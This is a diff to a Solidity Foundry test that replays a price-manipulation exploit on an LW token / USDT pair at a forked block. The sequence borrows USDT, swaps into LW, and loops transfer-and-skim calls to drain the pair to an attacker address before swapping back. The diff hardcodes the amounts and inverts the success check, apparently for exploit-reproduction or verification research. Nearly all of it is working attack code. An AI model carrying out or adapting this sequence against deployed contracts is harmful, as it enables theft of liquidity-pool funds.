@@ -181,34 +181,78 @@ contract LWTestBase is Test, BlockLoader {
 
     function burn_lw_pair(uint256 amount) internal eurus {
         for (uint i; i < 40; i++) {
+            emit log_named_decimal_uint("pair.balance", lw.balanceOf(address(pair)),18);
+            emit log_named_decimal_uint("attacker.balance", lw.balanceOf(address(attacker)),18);
             lw.transfer(address(pair), amount);
             pair.skim(address(attacker));
             lw.receive_eth();
         }
     }
 
+    // function test_gt() public {
+    //     vm.startPrank(attacker);
+    //     vm.warp(blockTimestamp);
+    //     vm.roll(29668034);
+    //     emit log_named_uint("amt0", 1000000 ether);
+    //     borrow_usdt_owner(1000000 ether);
+    //     printBalance("After step0 ");
+    //     emit log_named_uint("amt1", usdt.balanceOf(address(attacker)));
+    //     emit log_named_uint(
+    //         "amt2",
+    //         pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
+    //     );
+    //     swap_pair_attacker_usdt_lw(
+    //         usdt.balanceOf(address(attacker)),
+    //         pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
+    //     );
+    //     printBalance("After step1 ");
+    //     emit log_named_uint("amt3", (2510e18 * 1e18) / lw.getTokenPrice());
+    //     burn_lw_pair((2510e18 * 1e18) / lw.getTokenPrice());
+    //     printBalance("After step2 ");
+    //     emit log_named_uint("amt4", lw.balanceOf(address(attacker)));
+    //     emit log_named_uint(
+    //         "amt5",
+    //         (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
+    //             9) / 10
+    //     );
+    //     swap_pair_attacker_lw_usdt(
+    //         lw.balanceOf(address(attacker)),
+    //         (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
+    //             9) / 10
+    //     );
+    //     printBalance("After step3 ");
+    //     emit log_named_uint("amt6", 1000000 ether);
+    //     payback_usdt_owner(1000000 ether);
+    //     printBalance("After step4 ");
+    //     require(attackGoal(), "Attack failed!");
+    //     vm.stopPrank();
+    // }
+
     function test_gt() public {
+        uint256 amt0 = 0x932050ec9c9a280000;
+        uint256 amt1 = 0x931f0706ed9d200000;
+        uint256 amt2 = 0x14d3c16aaedbab000000;
+        uint256 amt3 = 0x12bd52d5016531000000;
+        uint256 amt4 = 0x4b0a53e8edde7800000;
+        uint256 amt5 = 0x9391412c46fff80000;
+        uint256 amt6 = 0x9391f0c47b84a80000;
+
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(29668034);
-        borrow_usdt_owner(1000000 ether);
+        vm.assume(amt6 >= amt0);
+        borrow_usdt_owner(amt0);
         printBalance("After step0 ");
-        swap_pair_attacker_usdt_lw(
-            usdt.balanceOf(address(attacker)),
-            pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
-        );
+        swap_pair_attacker_usdt_lw(amt1, amt2);
         printBalance("After step1 ");
-        burn_lw_pair((2510e18 * 1e18) / lw.getTokenPrice());
+        emit log_named_decimal_uint("amt3", amt3, 18);
+        burn_lw_pair(amt3);
         printBalance("After step2 ");
-        swap_pair_attacker_lw_usdt(
-            lw.balanceOf(address(attacker)),
-            (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
-                9) / 10
-        );
+        swap_pair_attacker_lw_usdt(amt4, amt5 * 95 / 100);
         printBalance("After step3 ");
-        payback_usdt_owner(1000000 ether);
+        payback_usdt_owner(amt6);
         printBalance("After step4 ");
-        require(attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -230,7 +274,7 @@ contract LWTestBase is Test, BlockLoader {
         burn_lw_pair(amt3);
         swap_pair_attacker_lw_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
